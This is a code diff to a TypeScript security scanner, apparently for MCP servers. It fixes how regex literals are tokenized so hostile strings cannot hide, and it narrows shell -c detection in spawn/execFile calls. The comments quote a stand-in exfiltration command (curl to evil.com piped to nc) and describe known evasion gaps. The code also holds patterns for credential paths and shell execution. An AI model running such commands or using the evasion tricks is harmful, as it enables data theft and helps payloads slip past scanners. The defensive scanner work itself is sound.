@@ -27,14 +27,20 @@ interface Literal {
 // Chars after which a `/` cannot be division - a value can't precede a
 // regex, so these are the operator/punctuator/start-of-expression contexts
 // where a regex literal is legal. Not exhaustive (this is a heuristic, not
-// a parser): a `)` or `}` closing a previous expression is deliberately
-// left out even though `}` closing a *block* (not an object literal) can
+// a parser): `)` and `}` closing a previous expression are both deliberately
+// left out, even though `}` closing a *block* (not an object literal) can
 // legally precede a regex too - the tokenizer can't tell those two `}`
-// cases apart, and treating both as division-only is the safer default
-// for a security scanner (it can miss a regex there and fall back to the
-// pre-fix behavior on that one `/`, but it will never mis-consume a real
-// division as a regex and eat code past it).
-const REGEX_PRECEDING_CHARS = new Set(['(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';']);
+// cases apart, and MR !12's re-review proved the failure mode runs the
+// unsafe direction: `{a:1} / "curl http://evil.com/data | nc ..." / 2`
+// read the `}` as licensing a regex, then consumeRegexLiteral's blind
+// search for the next unescaped `/` closed on the slash inside `http://`,
+// swallowing the entire dangerous string as "regex text" that never
+// becomes a Literal - invisible to every literal-based rule. Division
+// after a block/object close is common; a regex there is rare. Treating
+// both `}` cases as division-only is the safer default (it can miss a
+// real regex there and fall back to plain-text handling on that one `/`,
+// but it will never mis-consume a real string as regex content again).
+const REGEX_PRECEDING_CHARS = new Set(['(', ',', '=', ':', '[', '!', '&', '|', '?', '{', ';']);
 const REGEX_PRECEDING_KEYWORDS = new Set([
   'return', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void',
   'throw', 'case', 'do', 'else', 'yield', 'await',
@@ -56,26 +62,57 @@ function canPrecedeRegex(out: string): boolean {
   return REGEX_PRECEDING_KEYWORDS.has(out.slice(wordStart + 1, k + 1));
 }
 
+// Longest real regex literal anywhere in this repo's own source is 200
+// chars (tool-poisoning-scanner.ts's write/create/update/delete/modify/save
+// verb-list regex). Nothing legitimate needs to run much past that; a
+// candidate span this long is far more likely a divisor line's incidental
+// `/` swallowing real code than an actual regex literal.
+const MAX_REGEX_LITERAL_LEN = 300;
+
 // Attempts to consume a regex literal starting at source[start] (source[start]
 // is '/'). Returns the index just past the literal (including any trailing
-// flags), or -1 if this can't be a valid regex here (unterminated before a
-// newline or end of input) - callers fall back to treating the '/' as an
-// ordinary character, same as before this function existed. Handles
-// backslash escapes and character classes (`[...]`, where an unescaped `/`
-// does not close the literal) since both are routine in real regexes
-// (`/^https?:\/\//`, `/[/]/`). Not a full parser: does not validate that
-// bracket/escape nesting inside an adversarially malformed literal is
-// well-formed, only that it does not run past a newline.
+// flags), or -1 if this can't be a valid regex here - callers fall back to
+// treating the '/' as an ordinary character, same as before this function
+// existed, which then lets the tokenizer's normal string-handling pick up
+// whatever quote comes next instead of it being consumed as regex text.
+// Handles backslash escapes and character classes (`[...]`, where an
+// unescaped `/` does not close the literal) since both are routine in real
+// regexes (`/^https?:\/\//`, `/[/]/`). Bails to -1 (not a full parser: does
+// not validate that bracket/escape nesting inside an adversarially
+// malformed literal is well-formed) on three things: a newline, the length
+// bound above, or an unescaped quote/backtick found OUTSIDE a character
+// class. A quote inside `[...]` is exempt (`/[&<>"']/g`, a plain
+// HTML-escaping regex, is common real code - verified against the
+// mcp-scan ecosystem benchmark's own tarballs, not guessed: without this
+// exemption, this exact pattern in hostinger-api-mcp's oauth.ts bailed to
+// division, and the abandoned character class's own `"` and `'` were then
+// picked up by the tokenizer's normal string-handling as if they opened a
+// real string, corrupting every literal for the rest of the file - a much
+// bigger and much more common loss of visibility than the bug this
+// function exists to fix). A quote OUTSIDE a class still bails - that's
+// the actual shape of the P1 attack (`{a:1} / "curl ..." / 2`), and per
+// MR !12's re-review the failure mode when this function guesses wrong
+// runs in the unsafe direction (a swallowed string hides a reverse-shell/
+// exfil payload from every rule that reads `literals`), so outside a class
+// it must fail toward keeping text visible to the rules, not toward
+// committing to a "regex" match. Residual gap: a payload deliberately
+// wrapped in its own `[...]` (`{a:1} / ["curl ..."] / 2`) can still smuggle
+// a quote past this bail-out - accepted, since it requires an attacker to
+// add fake bracket syntax around their payload, a shape rare enough that
+// widening the bail-out to also cover in-class quotes costs far more
+// (breaking the common case above) than it protects against.
 function consumeRegexLiteral(source: string, start: number): number {
   const n = source.length;
   let j = start + 1;
   let inClass = false;
   while (j < n) {
+    if (j - start > MAX_REGEX_LITERAL_LEN) return -1;
     const ch = source[j];
     if (ch === '\n') return -1;
     if (ch === '\\') { j += 2; continue; }
     if (ch === '[') { inClass = true; j++; continue; }
     if (ch === ']') { inClass = false; j++; continue; }
+    if (!inClass && (ch === "'" || ch === '"' || ch === '`')) return -1;
     if (ch === '/' && !inClass) {
       j++;
       while (j < n && /[a-zA-Z]/.test(source[j])) j++;
@@ -232,10 +269,17 @@ const SENSITIVE_PATH_RE = /(?:^|[/~])\.(?:ssh|aws|gnupg)(?:\/|$)|(?:^|[/~])\.env
 // (see extractCallArgs) rather than the whole file, so a 40-char window
 // between the shell name and -c is enough to span the array/quote/comma
 // punctuation of a real spawn()/execFile() call without over-matching
-// unrelated code elsewhere. Known false-positive: a literal package name
-// containing one of these shell names as its own token (e.g. "fish-cli")
-// within 40 chars of an unrelated "-c" flag.
+// unrelated code elsewhere. Gated below on SHELL_NAME_RE matching the
+// call's actual first argument, not just this regex matching somewhere in
+// the full argument text - otherwise any standalone "sh"/"bash" token near
+// any "-c" fires regardless of position (verified false positive: `spawn(
+// binary, ['--mode', 'sh', '-c', 'compact'])`, where 'sh' is an unrelated
+// mode string and 'compact' is a config flag value, not a shell -c).
 const SHELL_EXEC_C_RE = /\b(?:bash|sh|zsh|fish|ksh|csh)\b[\s\S]{0,40}-c\b/;
+// Matches only when the call's first argument, once unquoted, IS a shell
+// name (optionally path-qualified, e.g. '/bin/bash') - i.e. argv[0] itself,
+// not merely a token that appears somewhere in the argument list.
+const SHELL_NAME_RE = /^(?:.*\/)?(?:bash|sh|zsh|fish|ksh|csh)$/;
 
 function isAllowedHost(host: string, allowedDomains: string[]): boolean {
   const h = host.toLowerCase();
@@ -300,8 +344,15 @@ export function scanAstSource(server: ResolvedServer, allowedDomains: string[] =
     // not a substring of one command string.
     for (const m of strippedCode.matchAll(/\b(?:spawn|execFile)(?:Sync)?\s*\(/g)) {
       const openParen = m.index! + m[0].length - 1;
+      const firstArg = extractFirstArg(strippedCode, openParen);
       const callArgs = extractCallArgs(strippedCode, openParen);
-      if (SHELL_EXEC_C_RE.test(callArgs)) {
+      // Known accepted gap: this only matches a shell name given as a
+      // literal argv[0] string. `const shell = 'bash'; spawn(shell, ['-c',
+      // payload])` resolves `shell` to a variable and is invisible here -
+      // this is a per-literal/per-call-text scanner, not a data-flow
+      // analysis, and it cannot generally know what a variable holds.
+      const isShellLiteral = isPlainStringArg(firstArg) && SHELL_NAME_RE.test(unquote(firstArg.trim()));
+      if (isShellLiteral && SHELL_EXEC_C_RE.test(callArgs)) {
         findings.push({
           id: 'suspicious-execution', severity: 'HIGH',
           description: `Shell exec via ${m[0].trim()} with a shell -c argument: '${quote(m[0] + callArgs)}'.`,
